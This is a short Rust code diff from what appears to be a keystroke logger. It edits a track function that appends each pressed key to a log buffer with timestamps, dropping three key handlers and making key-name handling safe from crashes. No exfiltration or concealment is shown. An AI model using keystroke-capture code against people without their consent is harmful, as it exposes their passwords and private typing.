@@ -145,18 +145,6 @@ fn track(event: Event) {
                 }
             }
         },
-        EventType::KeyPress(Key::Slash) => {
-            *LOG_FILE.lock().unwrap() += "/";
-            *LOGGED.lock().unwrap() = false;
-        },
-        EventType::KeyPress(Key::BackSlash) => {
-            *LOG_FILE.lock().unwrap() += "\\";
-            *LOGGED.lock().unwrap() = false;
-        },
-        EventType::KeyPress(Key::BackQuote) => {
-            *LOG_FILE.lock().unwrap() += "`";
-            *LOGGED.lock().unwrap() = false;
-        },
         EventType::KeyPress(Key::Return) => {
             let now = Utc::now();
             let x: String = format!("{}", now);
@@ -185,7 +173,7 @@ fn track(event: Event) {
         },
         EventType::KeyPress(Key::Unknown(_u32)) => println!("Unknown key!"),
         EventType::KeyPress(key) => {
-            let _key = event.name.unwrap();
+            let _key = event.name.unwrap_or(String::from(""));
 
             if CTRL_HOLDED.lock().unwrap().clone() {
                 match key {
